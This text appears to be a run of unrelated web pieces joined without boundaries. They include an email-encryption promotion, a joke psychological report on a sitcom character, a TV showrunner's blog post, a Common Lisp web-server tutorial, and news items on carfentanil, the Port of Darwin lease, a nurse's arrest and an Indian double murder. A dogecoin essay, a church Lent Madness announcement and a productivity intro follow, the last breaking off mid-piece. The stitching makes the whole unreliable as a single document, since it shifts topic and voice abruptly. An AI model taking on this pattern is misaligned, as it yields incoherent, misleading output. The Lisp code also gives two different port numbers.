This fact, however, is one of the reasons why so many Tutanota emails are encrypted: You can force your friends to use encryption. By adding a password to your contact, you can send an end-to-end encrypted email to any friend in the world, even if they use a Gmail account. Once they have seen how easy it is, many also sign up and switch to Tutanota.
There is no reason NOT to encrypt anymore
Even to people not very interested in protecting their privacy, there is simply no reason anymore to let the spies look into their mailbox while they can have exactly the same product with automatic encryption.
Maybe this is the biggest success of Tutanota: We don't need to convince you to trade in convenience for security. With Tutanota you'll get both.
Tutanota takes away the hassle by automatizing the encryption process. This makes it so easy that you don't even notice that you are emailing end-to-end encrypted. Everybody can do it, even your mother. This high level of convenience - all you have to do is letting your friends know about your new email address - leads to entire families or groups of friends signing up.
Of course we can't really know this because we - as well as third parties - can't read your emails or your contacts. But people tell us how they made their entire family sign up when they send emails to our support team. The tone of these emails to us makes us smile time and time again: They are so happy that finally they have found a way to communicate securely with family and friends.
We are very happy that the percentage of end-to-end encrypted emails is rising so quickly. This makes our online communication as a whole much more secure as we make it harder for the spies to monitor everything. Mass surveillance is an intrusion on everybody's right to privacy so it needs to stop. If Secret Services deny changing their habits, we have to change ours:
Encrypt every email.
PSYCHOLOGICAL REPORT
Name: Michael Gary Scott
Date of Birth: March 15, 1964
Education: High school diploma
Employment: Regional Manager, Dunder Mifflin Scranton (past), CEO, Michael Scott Paper Company (past), Director of Paper Distribution, Department of Natural Resources (current)
Date of Initial Interview: 9/23/2010
Date of Report: 5/16/2013
Therapists: Katie Gordon, Ph.D., Brandon Saxton, B.S.
Presenting Problem
Michael Scott presented as a 46-year-old man who was referred, interestingly, by all of his employees and supervisors at the Dunder Mifflin Paper Company. Michael was referred primarily due to problems related to a consistent pattern of interpersonal conflicts. The behavioral symptoms Michael was exhibiting have resulted in financial, vocational, and social impairment.
History of Presenting Problem
Behavioral observations were gathered to determine the extent and severity of Michael's presenting problem. We selected a few of the more diagnostic moments to outline in further detail. An exhaustive outline can be gleaned through watching The Office.
Some of the specific examples that we observed included:
Experiencing emotions that are unstable, intense, and/or out of proportion with the given circumstances When Michael asks Carol (his realtor and, at the time, short-term significant other) to marry him spontaneously at a Diwali celebration When Michael photoshops himself into a picture of Carol and her children by putting his face over the face of her ex-husband and uses it as a Christmas card When Michael locks all of his co-workers in the office after they joke that jail seemed better than the office When a pizza delivery boy does not accept Michael's coupons and he won't let him leave the building Demanding one of his gift baskets back when potential customers won't give Dunder Mifflin their business
Attention-seeking in ways that antagonize others Getting an iPod for the office Secret Santa exchange instead of sticking to the $20 limit Buying himself a World's Best Boss mug Taking over the corporate-mandated diversity training and making his own “diversity training” Calling meetings others have to attend, often times for personal reasons Insisting on being in Phyllis' wedding party and giving an uninvited toast
Behaving irresponsibly, impulsively, and engaging in dangerous risk taking Quitting his job to start his own paper company on a whim Reconciling with his ex-girlfriend Jan because she got breast implants Promising economically disadvantaged children that he will pay for their college tuition if they graduate from high school when he does not have the resources Playing with the baler in the warehouse despite how unsafe it is and being explicitly told not to Planning to jump off a building onto a bounce house
Family History
Michael was born in Scranton, PA. He came from a single-parent home (though his mother did remarry) and described his childhood as lonely. Michael stated that he has an older brother as well as a half-sister with whom he had a tumultuous relationship. However, the two did reconcile, leading to Michael hiring his nephew Luke as an intern. Michael did not talk much about his childhood, but did offer a few memories that seem to stand out to him. For example, Michael was once featured on an episode of the television show Fundle Bundle. On the episode, when asked what he would like to do when he grows up, Michael replied,“I wanna be married and have 100 kids so I can have 100 friends. And no one can say no to being my friend.” Another childhood memory Michael has was attending a baseball game with Jeff, who he identifies as his “mother's boyfriend, who she married.” Michael went on to say that during the game he “… felt really bad, because the pitcher wasn't able to play with his friends anymore. But Jeff said that the manager was making a really good move, by taking the pitcher out. He really respected the manager.”
Educational/Employment History
Michael graduated from high school on time in Scranton, PA. He was not able to attend college though, as he lost his tuition money in a pyramid scheme. Michael seemed to hold a variety of jobs during/after high school, including a position as a greeter at Men's Warehouse. He reported receiving his position at Dunder Mifflin after following an attractive woman to the office park, where the Scranton office is located. Michael started with the company as a salesman, a position in which he excelled. After becoming the best salesman in the company, evidenced by his winning consecutive awards for best salesman, Michael was promoted to a regional manager position. Unfortunately, it seemed that the qualities that made Michael great at sales did not translate to the managerial position.
Psychiatric/Medical History
After Michael physically reprimanded his nephew, Luke, for being insubordinate, the corporate office mandated that he attend six hours of counseling with Toby Flenderson from the Human Resources department of the Scranton branch. Due to Michael's strong dislike of Toby, he refused to engage in the counseling process. Michael began the session by refusing to speak and then reporting fictional stories as his own life. Over time, Michael began to inadvertently share details from his life with Toby. Once he realized this, Michael got angry and refused to participate. Toby eventually gave up on the entire process and allowed Michael to fill out the counseling report himself. The records indicated that Michael was severely depressed and homicidal. We have chosen not to include these results further in this assessment, as we question their validity.
Diagnostic Impressions
As mentioned above, information about the presenting problem was obtained through behavioral observations (i.e., viewing The Office repeatedly) and by filling out a self-report personality questionnaire as we imagined Michael Scott would (this is not a valid method and should not be used in real life).
Because Michael exhibited a persistent pattern of interpersonal issues, it was hypothesized that he might meet criteria for a personality disorder. While Michael had substantial distress and impairment from issues associated with his personality characteristics, he did not meet diagnostic criteria for any of the ten personality disorders that are specified in the current version of the Diagnostic and Statistical Manual of Mental Disorders – Fifth Edition (DSM-5). Rather, his symptoms were best captured by a category that is used when there are significant personality issues that do not fit within the other categories: other specified personality disorder.
A diagnosis of other specified personality disorder does not provide nuanced details about Michael's specific presentation, so we utilized the alternative model for personality disorders in the appendix of DSM-5 to further explore his presentation. This model moves away from the traditional categorical models of personality disorder (i.e., you either have a personality disorder or do not, with no in-between) through its focus on dimensional measures of 1) personality functioning impairment in four domains and 2) five research-derived pathological personality traits.
We rated personality functioning impairment on the DSM-5 scale from 0 (little or no impairment) to 4 (extreme impairment) based on the match between our behavioral observations and one or more of the descriptions at each level. The results are presented and described below:
Identity (moderate impairment): “Has vulnerable self-esteem controlled by exaggerated concern about external evaluation, with a wish for approval” and “Emotional regulation depends on positive external appraisal. Threats to self-esteem may engender strong emotions such as rage or shame”
Self-Direction (some impairment): “May have an unrealistic or socially inappropriate set of personal standards, limiting some aspects of fulfillment”
Empathy (severe impairment): “Ability to consider and understand the thoughts, feelings, and behavior of other people is significantly limited” and “is confused about or unaware of impact of own actions on others”
Intimacy (severe impairment): “Relationships are based on a strong belief in the absolute need for intimate others”
Pathological personality trait scores were derived from the self-report questionnaire that we filled out as we thought Michael would (again, you should not do this in real life ever). Scores ranged from a minimum of 0 (reflecting low levels of a trait) and a maximum of 3 (reflecting high levels of a trait) and were believed to underlie the functional impairment described above. The results are presented and facets that fit Michael are listed:
Negative Affect: “instability of emotional experiences and mood; emotions that are easily aroused, intense, and/or out of proportion to events and circumstances”
Detachment: This refers to a tendency to generally avoid interpersonal experiences and does not apply to Michael.
Antagonism: “engaging in behavior designed to attract notice and to make oneself the focus of others' attention and admiration”
Disinhibition: irresponsibility, impulsivity, distractibility, dangerous risk-taking
Psychoticism: This reflects odd or bizarre thought processes and behavior and does not apply to Michael.
Treatment Recommendations
In summary, the most appropriate categorical diagnosis for Michael Scott was other specified personality disorder. His significant distress and impairment appeared to be most related to his persistent pattern of speaking and behaving impulsively (reflecting his high levels of disinhibition), paired with an intense need to be liked. When he believed that someone disapproved of him or his behavior (often because he had offended them with his impulsive behavior due to impaired perspective-taking), he tended to spiral into a dysregulated, negative emotional state (consistent with his elevated level of negative affect). He then coped with this painful emotional state by engaging in attention-seeking (reflected in his elevated level of antagonism), and sometimes vengeful, behavior which usually exacerbated the problem.
While there is not a specific scientifically-tested and supported treatment for other specified personality disorder, there are therapeutic strategies designed to specifically strengthen impulse control, increase interpersonal skills, and build adaptive emotional coping. Michael would likely experience improvement in his symptoms if he worked with a therapist in these areas, while capitalizing on his strengths: being a fun-loving person who cares a lot about his relationships with others.
Status at Termination (last episode)
At follow-up, Michael exhibited substantial improvement in his personality functioning. While he retained his unique (and sometimes inappropriate) sense of humor and life perspective, he appeared to become more skilled at navigating interpersonal relationships and formed meaningful relationships with his co-workers. Their affection for Michael was evident as they said good-bye to him when he moved to Colorado to be with his wife, Holly, and their excitement at seeing him a few years later at Dwight & Angela's wedding. He reported that he and Holly had a fun and mutually supportive marriage and that he enjoyed being a father very much.
THE GORDON/SAXTON TEST
Was the portrayal of mental illness accurate?
Michael Scott was created as a comedic character who repeatedly offends people by speaking and acting in incredibly inappropriate ways. While the creators of the show were likely aiming to make a character who would make people laugh because of his unusual personality, it is highly doubtful that they had a personality disorder in mind. Thus, by design, Michael Scott is not a realistic representation of someone suffering from a mental disorder. That being said, some of the aspects of his personality that lead to problems (excessive and intense need for others' approval, disinhibited behavior, marked emotional fluctuation) do represent realistic components of some mental disorders. However, these pathological personality traits do not typically present in the extreme and silly manner that is portrayed in The Office. In conclusion, no, it is not an accurate portrayal of mental illness, but Michael Scott is an incredibly entertaining character.
Was the character struggling with mental health issues depicted with compassion?
In the earlier episodes of The Office, Michael is not presented as a sympathetic character. He ridicules numerous people based on personal qualities (e.g., appearance, age, ethnicity, sexual orientation, ability, gender) and acts in an irrational manner. However, as the seasons progress, the audience sees more of Michael's sweet, caring, fun side, and this results in more compassion for his struggles and more sympathy about his lack of insight into his role in his own struggles.
Guess who's going in for surgery tomorrow morning to get a couple of lumps removed from his noggin'? Today, we treated him – and Lulu – to a stroll through Granville Island and a visit to a local pet boutique. We picked up treats, a patriotically handsome bow tie/collar but, sadly, not that awesome Hawaiian shirt we had our hearts set on because it didn't come in his size.
Meanwhile, a post-Lasik Akemi (“I got my eyeballs fixed!”) is enjoying her improved vision – to a certain point. She spent most yesterday madly sweeping, vacuuming, and generally cleaning the place. When I asked what had gotten into her, she informed me that now that her sight is improved, she can actually see how messy everything is. I feel her situation is reminiscent of some tragic character from Greek lore, but I'm not sure which one.
Hey! May I direct your attention to some pretty damn fantastic Dark Matter articles…
First off, a great, GREAT article by The Nerd Recites' Christopher Hart titled How Dark Matter Utilizes Akira Kurosawa's Seven Samurai Within Its Narrative
“We matched up Dark Matter‘s characters against each of the personality types and all of the characters fell into the set types with such astounding ease that this only lends further credence to the writers' utilisation of this trope.”
In interviews, whenever asked about my inspirations for Dark Matter, I always cite: Cowboy Bebop, The Thunderbolts, The Dirty Dozen, Stargate, The Shield, Stargate, and, yes, The Seven Samurai! Good catch, Christopher.
Meanwhile, over at The Workprint, Jen Stayrook wonders Who Will Betray the Crew of The Raza? Building off Milo's prophetic warning in “We Should Have Seen This Coming”, she breaks down the list of suspects and posits an intriguing theory or two. What do you think?
Continuing a weekly tradition, I sit down with Kelly Townsend of The TV Junkies and discuss the most recent episode of Dark Matter. I drop a lot of interesting little tidbits in this one…
“One of the big picture things is this looming corporate war, and as Milo says, there are certain moments of history where individuals can step in and make a difference, and that's something that will resonate as we head towards the back half of Season 2.”
And a nice little write-up on the show at Mikhail's Film and TV Blog: Why Sci-Fi Fans Should Watch Dark Matter
“This year, while browsing Netflix, I chanced upon a new, engrossing space opera that Sy-Fy aired earlier than part of its agenda to revive its status as the premiere channel for science fiction television. […] After seeing the 13-episode first season, I'm ready to declare it one of the best new sci-fi shows on television. Here are a few key reasons why it's absolutely worth seeing.”
Thanks for the support, Mikhail!

This is a short guide to setting up a lisp-powered website with Hunchentoot and Talcl/Buildnode. Hunchentoot is a web server, Talcl is a templating system, and Buildnode is a CXML helper library Talcl uses. These are from notes I made while writing an app to help my wife record attendance and student progress for dance classes.
My high-level approach on my hobby projects is to write the user interfaces using mostly pure HTML/Javascript/CSS and jQuery, and then make a RESTful (mostly) API with Hunchentoot's Easy Handlers that the Javascript front-end calls to perform some operations. For some reason things like parenscript and cl-who never felt right to me. Anyhoo, let's get started.
Foundation
I'm calling this project “Alice”, so time to make the foundation:
(quickproject:make-project "~/lisp/alice/" :depends-on '(:iterate :alexandria :talcl :hunchentoot :buildnode))
I generally always include iterate and alexandria, and we'll want a few things from buildnode directly so we're depending on that separately from talcl. Quickproject makes all my files, and I'm good to start.
Here's the basic goal:
I want to have my templates stored in .tal files, and hunchentoot will need a place to look for static files, so we start with a few new directories: “www” for hunchentoot and “templates” for tal. To easily get paths to these, I added a helper function:
(defun resource-path (path) "looks up path relative to whereever this asdf system is installed. Returns a truename" (truename (asdf:system-relative-pathname :alice path)))
Hunchentoot
Now the fun begins. Next is a function to start the hunchentoot acceptor (which will handle listening on a port and dispatching requests) AND configure the static file handling I wanted.
(defvar *acceptor* nil "the hunchentoot acceptor") (defun start-server (&optional (port 8888)) (setf *acceptor* (make-instance 'hunchentoot:acceptor :port port)) ;; make a folder dispatcher the last item of the dispatch table ;; if a request doesn't match anything else, try it from the filesystem (setf (alexandria:last-elt hunchentoot:*dispatch-table*) (hunchentoot:create-folder-dispatcher-and-handler "/" (resource-path "www"))) (hunchentoot:start *acceptor*))
By having the folder-dispatcher-and-handler as the last item in hunchentoot's *dispatch-table*, it will only bail to the filesystem if no other handlers match. Hunchentoot has a *default-handler* mechanism, but it is limited; default-handlers do not have access to any request information.
Now I toss a stub style.css into my www/ directory, call start-server, then can load http://localhost:8080/style.css in my browser. Great, the right half of my desired flowchart is done. Now the Talcl part.
Talcl
Talcl reads template files, compiles them into lisp functions that accept a tal enviroment. The tal environment is a set of key/value pairs that will fill in the templates. Talcl has a bunch of features to handle writing to streams, but for now I'll just generate strings and pass them to hunchentoot.
(defvar *tal-generator* (make-instance 'talcl:caching-file-system-generator :root-directories (list (resource-path "templates"))))
The tal generator maps template names to template files, compiling the templates if needed. There are a few different classes that can be used here, but this one checks file dates and recompiles only if the file is newer.
(defun render-page (template &optional tal-env) "renders the given template" (talcl:document-to-string (buildnode:with-html-document (talcl:tal-processing-instruction *tal-generator* template tal-env))))
This helper function takes the template name and the optional tal environment, and returns a string of the final output. Talcl deals in XML, but HTML is not XML so I use the buildnode:with-html-document macro to resolve the mismatches (eg: <script src=…></script> instead of <script/>). According to Talcl examples, there are several ways to get your tal content into an XML document, and tal-processing-instruction is the fastest.
(hunchentoot:define-easy-handler (home :uri "/") () (render-page "home.tal" (talcl:tal-env 'course (current-course))))
This adds a handler to hunchentoot's table, and should get us going down the left branch of my flowchart. The tal-env call is creating the tal environment where to compile template function will look for substitutions. I think of these like keyword arguments for the template. In this case, I'm pulling some course information and passing it to home.tal.
Tal Templates
The last complicated bit is the tal templates themselves. There are some good examples in the talcl repository. I want one tal file to be the main site template, a frame around whatever content I'm trying to show with all the html,head,body tags. Then I'll have one tal file for each major UI element.
The overall site template will be in templates/template.tal:
<html lang="en" xmlns:tal="http://common-lisp.net/project/bese/tal/core" tal:in-package=":alice"> <head> <meta charset="utf8"/> <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js"/> <script src="/script/alice.js"/> <link rel="stylesheet" href="/css/style.css" type="text/css" /> </head> <body> <span id="body">$body</span> </body> </html>
Since this is XML, we need some xmlns noise at the top, but we can use XMLisms like “<script/>”. The key things to note here:
tal:in-package=":alice" – need to tell Tal where it should be evaluating
– need to tell Tal where it should be evaluating $body – this is one way to substitute values into the template. Talcl will look for a symbol 'alice::body in it's tal environment
So that's our main template file, now for the home.tal file:
<tal:tal xmlns:tal="http://common-lisp.net/project/bese/tal/core" xmlns:param="http://common-lisp.net/project/bese/tal/params" tal:in-package=":alice"> <tal:include tal:name="template.tal"> <param:body> <button>Start Jam Class</button><br/> <tal:loop tal:var="c" tal:list="(classes course)"> <a href="class?name=$(name c)">Start $(name c) Class</a> </tal:loop> </param:body> </tal:include> </tal:tal>
I have the same xmlns noise, but have a new one namespace, param. This is the xml namespace tal uses to pass information from one template to another. The top level XML node is a “tal:tal” node, which does not render any output. I include template.tal to get our main template, passing it the UI for this page in a param:body. This adds 'alice::body to the tal environment, with the XML contents as the value, then template.tal is called. I use some fancier tal statements to loop over all the dance classes in the given course and make a link to each one.

Happy hacking!
Dangerous Use of Carfentanil Drug on the Rise in the Lowcountry
| Share: May 25, 2017, 10:24 am ESTShare:
BERKELEY COUNTY, SC (WTAT-TV) — It's more potent than morphine and heroin which means it's also just as deadly. That's why Berkeley County EMS officials are warning about carfentanil.
Often disguised as heroin, carfentanil can be deadly and EMS officials say they have seen more of it during the past several months.
It's a synthetic opioid that is 10,000x more powerful than morphine and 100x stronger than fentanyl.
Doctors say only a few micrograms can stop the heart. And while there are no reports of deaths in Berkeley County, doctors at Trident Medical Center say they are seeing cases of it.
“If you can identify that someone is having overdose and you can start intubating them, placing a breathing tube or putting them on life support, the quicker you do that the better the chance they have to not suffer any brain damage or to ultimately die,” said Dr. Eric Wright, Emergency Physician, Trident Medical Center.
Doctor Wright says Narcan is an antidote for overdoses of opioids. It can reverse the symptoms of carfentanil and other synthetic drugs.
Berkeley County EMS responders keep it available when they're called to possible drug overdoses.
This year saw, among other conferences, the second marketing strategy workshop for the LibreOffice project. While a workshop's slides tend to be rather short and relatively unimportant, I intended to publlish some feedback that's on the Marketing Pad as well as my own impressions about the state of marketing activities in the project. My slides emphasized what was going wrong more than what was right but it was nonetheless useful to start the workshop on that basis.
In a nutshell, what came out of our discussion was that, while there was an acknowledgement that the strategy was the right one, its execution was poor mostly because of the lack of resources and the time to structure a team. Another important part of the discussion was about the tools and the ways to contribute. On this chapter, we recognized two outstanding needs:
Tools that are better suited to the needs of marketing contributors: the wiki is a mess, and it's not likely to change anytime soon, but then it's not overly clear that we need the wiki on a daily basis. However, and as an example, a file repository would be very useful. I hear that Florian and Robinson stand ready with an OwnCloud Server. Let's see…
Restart the marketing confcalls -if not conference calls, IRC chat- and create the social seed for an autonomous marketing team to emerge, documenting the various activities, big or small of everyone present.
Also useful were the presentation of Eliane Domingos about the LibreOffice magazine (I hope to have the slides soon!) as well as mine (ho-hum) about the use of social networks for the LibreOffice project. More importantly and on a quite positive note, we had several people signed up to join the marketing team on the spot. I look forward to seeing them and working with them soon.
As a general remark, it's fair to say that this conference has taken place at a very interesting moment for the LibreOffice project. We stand at the crossroads where many of the initial promises of the project founders have been delivered; but it is precisely the moment when the project needs a broader and more ambitious vision with more ambitious needs. As such, the project sometimes seems to wiggle around its too small and old clothes and needs bigger ones. We're not newborns anymore, we're three years old 🙂
I wish the LibreOffice project a big success, and send my deep thanks to the conference organizers as well as the workshop members. See you in 2014!
The top official for vetting foreign investment was so concerned the Port of Darwin would be leased to a Chinese company that he asked three times for the Department of Defence and intelligence agencies to consider the national security implications "at the highest possible level".
The Foreign Investment Review Board (FIRB) and the Department of Defence are under scrutiny over the Northern Territory's decision to lease the port to Landbridge, which has links to the People's Liberation Army, and was allowed to take place through a legal loophole that made it exempt from federal approval.
The board's chairman, Brian Wilson, said he became aware of the deal in late 2014 and asked for a response from Defence and intelligence agencies in early 2015 and again in March. After a second response from Defence expressing no reservations to the deal, Mr Wilson asked for it to be considered a third time "at the highest possible level".
Former Director General of ASIO David Irvine at the AFR Defence and National Security roundtable in Sydney. Jeremy Piper
Had he known the Australian Navy would have guaranteed access to the port for only the first 25 years of Landbridge's 99-year lease: "I would have asked the question of the Navy again for the fourth time, and I would have had to accept it."
"It is truly on their heads; they are the experts here," he said.
The Salt Lake City police officer who arrested and allegedly assaulted a nurse for refusing a blood draw from an unconscious patient has been placed on administrative leave, the mayor's office said Friday.
In a body cam video taken July 26 at the University of Utah Medical Center that went viral Friday, nurse Alex Wubbels is seen explaining to Salt Lake detective Jeff Payne that she couldn't allow a blood draw on a patient who had been injured in a car accident. Wubbels told Payne that the patient is required to be conscious to give consent, unless the patient is under arrest or if officers had a warrant.
Wubbels points out to Payne that these parameters are spelled out in an agreement between the hospital and the department.

Despite the warning, Payne is heard saying, "We are done, we are done, you are under arrest."
He can then be seen grabbing Wubbels and cuffing her as she screams, "You're assaulting me stop! I've done nothing wrong! This is crazy! This is crazy!"
In the video, Payne's partner could be heard trying to calm his partner down during the arrest.
Another officer is heard saying, "I don't think this arrest is going to stick."
The hospital security camera also captured parts of the incident, including what appears to be officers forcing her outside.
Mayor Jackie Biskupski said there will be a criminal investigation by the Salt Lake City police department and the district attorney. As a result of the criminal investigation, the officer is being placed on full administrative leave.
"The only job I have is to keep my patient safe," Wubbels said in a press conference Friday.
The University of Utah said in a statement that Wubbels had "followed procedures and protocols in this matter and was acting in her patient's best interest," according to CBS affiliate KUTV.
Note: The following article was submitted as part of the Ziftr contest and chosen as the winner on the topic of 'What will it take for Bitcoin to gain mass acceptance?'
Although nobody knows for certain what the future holds for the cryptocurrency industry as a whole, it is almost unanimous among pundits and prognosticators that the Blockchain technology is here to stay.
There is little doubt that cryptocurrency will play a significant role in our lives within the next 5 to 10 years; in a recent Wall Street Journal poll “83% of those surveyed believe, “there is a future for cryptocurrencies such as bitcoin.”
But what will that digital landscape look like? Which coins will succeed and which coins will fade away into cyber obscurity? While it would be impossible to predict the destiny of the more than 500 cryptocurrencies currently on the market, the top three, bitcoin, litecoin and dogecoin are traveling along a path where their roles are coming into focus.
Bitcoin: digital gold
Most cryptocurrency experts will tell you that Bitcoin is destined to be the dominant digital currency used in internet commerce for the foreseeable future; but I see a different future for Bitcoin. The vast majority of people currently purchasing it are holding it as a speculative investment instead of spending it like a currency. According to a 2014 Forbes article by Samantha Sharf, “over 90% of bitcoins are hoarded.”
When Satoshi Nakamoto created the currency, he designed it to mimic the scarcity of gold. Only 21 million bitcoins will ever exist and since the block reward will dwindle to just 0.78 BTC by 2032, it will inevitably lead to even more hoarding.
Because bitcoin has a fixed supply it is deflationary by design, therefore the longer coins are held the greater the buying power they should have. How many times have we all heard stories of people who mined or purchased a large number of bitcoins when they were almost worthless that now own hard drives that are literally worth many times their weight in gold?
Because of this most people primarily view bitcoin as an investment vehicle to drive them down the road to wealth and prosperity rather than an instrument for facilitating retail transactions.
Bitcoin is becoming exactly what it was created to be - the digital version of gold. It is mined like gold, it is scarce like gold, and it can't be counterfeited like gold only easier to store and transfer.
Litecoin
So does this mean litecoin will become the dominant currency for e-commerce with conformation times that are four times faster than Bitcoin? Like bitcoin, litecoin is also a deflationary currency and even though it has a larger supply limit of 84 million compared to Bitcoin‘s 21 million, it also mimics gold and is still mainly held as an investment rather than spent like a currency.
With a per coin value that is roughly 1/15 the price of bitcoin, litecoin is a poor man's bitcoin and the equivalent of digital silver to bitcoin's digital gold. Just as silver attracts many investors so does litecoin, but investors are not consumers and if a currency is going to be a currency it needs to be spent by consumers.
Dogecoin
This is where I believe Dogecoin comes in. At the moment most people who purchase significant amounts of dogecoin are also buying it as an investment, but after cryptocurrencies achieve mass acceptance and their prices go up, dogecoin holders will spend it freely instead of hoarding it.
This is because, unlike bitcoin and litecoin, dogecoin is not deflationary since its supply is uncapped; therefore after its price peaks the declining yearly inflation rate currently 5.256% (4% in 2019, 3.4% in 2025 and 2.5% by 2035 etc.) will keep pace with economic growth and cause the coin's value to remain stable.
A stable price will encourage people to spend dogecoin instead of hoarding it in hopes that the coin will keep going up in value forever. Having an uncapped supply also keeps transaction fees low since miners will always be rewarded and have an incentive to process transactions and keep the network secure.
These features are all conducive for dogecoin to emerge as the frontrunner in facilitating retail transactions. In the future, I believe that both bitcoin and litecoin will continue to be held mainly as a digital gold and digital silver investment while dogecoin will become the new digital dollar.

Sen. Mary Landrieu (D-La.) speaks to the media about her campaign and her record after talking at the Louisiana Municipal Association's annual convention on Aug. 2 in Baton Rouge. (Melinda Deslatte/AP)
Sen. Mary Landrieu (D-La.) might want a do-over about now. Asked by NBC's Chuck Todd why President Obama is so unpopular in Louisiana, Landrieu first gave a long answer about energy policy.
But then she waded into more fraught territory: race.
“I'll be very, very honest with you; the South has not always been the friendliest place for African Americans,” Landrieu said. “It's been a difficult time for the president to present himself in a very positive light as a leader."
She also said that women have struggled in the South, but her comments on race got much more attention -- including a brief airing on "NBC Nightly News" -- because that's how it is with race.
First thing to note: This is basically third-grade social studies kind of stuff, right? Remember how that whole "Southern strategy" later prompted Republican National Chairman Ken Mehlman to apologize in 2005 at an NAACP event?
By the '70s and into the '80s and '90s, the Democratic Party solidified its gains in the African American community, and we Republicans did not effectively reach out. Some Republicans gave up on winning the African American vote, looking the other way or trying to benefit politically from racial polarization. I am here today as the Republican chairman to tell you we were wrong.
The racial history of the South has played out at the ballot box. It exists. Landrieu isn't breaking any new ground here. She is however, breaking an unwritten rule in politics -- it's best not to talk about race, unless it's about how far we've come.
Her opponents have pounced on her response, calling it divisive and suggesting she's calling her own state racist.
"Quite frankly, Sen. Landrieu owes the people of Louisiana an apology for relegating them to nothing but racists and sexists," her opponent, Rob Maness, a tea party challenger, said in a statement.
Rep. Bill Cassidy (R-La.), her other opponent, said the opposition to Obama has more to do with policy than race.
“I gotta tell ya, when people in Louisiana look at Obamacare and his regulatory regime and him going after their job, that's the reason they oppose him, that's the reason they oppose her,” Cassidy said. “She supports him 97 percent of the time. We're not racist; we just all have common sense.”
Of course, read another way, Landrieu's comments could be geared toward increasing black turnout. But she also has to get white support for a winning multiracial coalition. Southern Democrats have fared increasingly poorly among whites (see: the Southern strategy), and it's hard to see Landrieu's comments helping her navigate an already-tough tightrope.

The couple were murder for disobeying the diktat of the panchayat, police said.
A young man belonging to the Scheduled Castes and his Muslim wife were hacked to death in broad daylight in a village of Hapur, Uttar Pradesh, on Saturday - allegedly by the woman's brother - for defying the diktat of the panchayat and staying married.Sonu, a 22-year-old craftsman, and Danishta Begum, 21, had got married four months ago. The couple was staying together at his house in Fatehpur village, approximately 75 km from Delhi .The two families had been neighbours for 13 years. And the village is just 70 km from Muzaffarnagar, which witnessed communal riots last year.But the local panchayat ordered they separate after the woman's family claimed they had not seen the certificate of marriage. The couple claimed they had got married in court.Danishta shifted to her parents' home but when a week later, she went to meet her husband, her family became furious.On Saturday, her brother Talib hacked Sonu to death with a sword in full public view. When his sister tried to intervene, he slit her throat as well.The police have registered a case of murder. Talib and the girl's mother Noor Jehan, who surrendered at the police station, have been formally arrested. Four other accused are absconding - two brothers of the woman, Asif and Tasleem and their friends Zaffruddjn and Amiruddin."Caste or religion did not come into play in this murder, since the woman was living with her in-laws for four months. It was disobeying the panchayat that had provoked her family," said Rajinder Kumar, the superintendent of police, Hapur.Sonu's father Satyavan said the murders were "pre-planned". The locality is predominantly Muslim and his family is the only scheduled caste family that stays there. "My son was murdered in broad daylight and no one saved him. I will leave the village since I feel unsafe here. We don't feel anyone here is ready to help us if we get in trouble," he said.

Lent Madness 2019 The Saintly Smackdown is back!
Just when you thought Lent couldn't possibly become even more penitential, have we got an online hair shirt for you! For the tenth year running, people of faith are filling out saintly brackets and gearing up for the 2019 “saintly smackdown.”
With its unique blend of competition, learning, and humor, Lent Madness allows participants to be inspired by the ways in which God has worked through the lives of saintly souls across generations and cultures. Throughout Lent, thirty-two saints will do battle to win the coveted Golden Halo. Based loosely on the NCAA basketball tournament of a similar name, this online devotion pits saints against one another in a bracket as voters choose their favorites throughout this penitential season.
Here's how to participate: on the weekdays of Lent, information is posted at www.lentmadness.org about two different saints. Each pairing remains open for 24 hours as participants read about and then vote to determine which saint moves on to the next round. Sixteen saints make it to the Round of the Saintly Sixteen; eight advance to the Round of the Elate Eight; four make it to the Faithful Four; two to the Championship; and the winner is awarded the coveted Golden Halo.
The first round consists of basic biographical information about each of the 32 saints. Things get a bit more interesting in the subsequent rounds as we offer quotes and quirks, explore legends, and even move into the area of saintly kitsch.
This year, Lent Madness features an intriguing slate of saints ancient and modern, Biblical and ecclesiastical. 2019 heavyweights include Ignatius of Loyola, Nicodemus, Margaret of Cortona, John Chrysostom, and Nicholas of Myra (aka St. Nick). The competition kicks off on “Ash Thursday,” March 7, with an epic battle between Biblical saints Mary and Martha.
The full bracket is online at the Lent Madness website www.lentmadness.org and, while not necessary to participate, you can order The Saintly Scorecard: The Definitive Guide to Lent Madness 2019 at www.forwardmovement.org. This companion guide includes biographies of all 32 saints, a full-color bracket, and information about how to fully participate.
Lent Madness began in 2010 as the brainchild of the Rev. Tim Schenck, an Episcopal priest and rector of St. John's Church in Hingham, Massachusetts. In seeking a fun, engaging way for people to learn about the men and women who make up the church's calendar of saints, Schenck devised this devotion. Combining his love of sports with his passion for the lives of the saints, Lent Madness was born.
Starting in 2012, Schenck partnered with Forward Movement (the same folks that publish Forward Day by Day) executive director Scott Gunn, to bring Lent Madness to the masses. Schenck and Gunn form the self-appointed Supreme Executive Committee, a more-or-less benevolent dictatorship that runs the entire operation.
Borrowing inspiration from yet another national sporting event, Schenck and Gunn are referring to the 2019 competition as Lent Madness X.
Over the years, the formula has worked as this online devotional has been featured in media outlets all over the country including national television, the Washington Post, NPR, USAToday, and even Sports Illustrated (seriously). More importantly thousands of people have been inspired by the saintly stories of those who have come before us in the faith.
Ten “celebrity bloggers” from across the country have been tapped to write for the project: the Rev. Amber Belldene of San Francisco, CA; the Rev. Laurie Brock of Lexington, KY; the Rev. Megan Castellan of Ithaca, BY; Anna Fitch Courie of Honolulu, HI; Dr. David Creech of Morehead, MN; the Rev. David Hansen of Woodlands, TX; Emily Miller of Chicago, IL; Carol Howard Merritt of Chattanooga, TN; The Rev. Marcus Halley of Minneapolis, MN; and the Rev. David Sibley of Walla Walla, WA. Information about each of the celebrity bloggers and the rest of the team is available on the Lent Madness website.
If you're looking for a Lenten discipline that is fun, educational, occasionally goofy, and always joyful, join the Lent Madness journey. Lent needn't be all doom and gloom. After all, what could be more joyful than a season specifically set aside to get closer to Jesus Christ?

If there's one thing I've learnt in my first year of remote work, it's that productivity is a fickle mistress.
From morning routines to tools which lock your computer for 10 minutes every hour, there are almost innumerable ways the wide web will profess to boost your efficiency with practically no effort.
Unfortunately, most (but not all) of it is rubbish.
Humans aren't machines, and there will forever be the struggle of staying on track under the constant temptation of distraction.
Perhaps you're uploading an image to Imgur for distribution purposes, only to lose a half hour to a collection of Calvin and Hobbes.
Alternatively, you could be looking to engage with a Twitter list of influencers once a week and become bogged down with the many tempting posts in your feed.
Productivity Tools Are Great, But You Are What You Drink
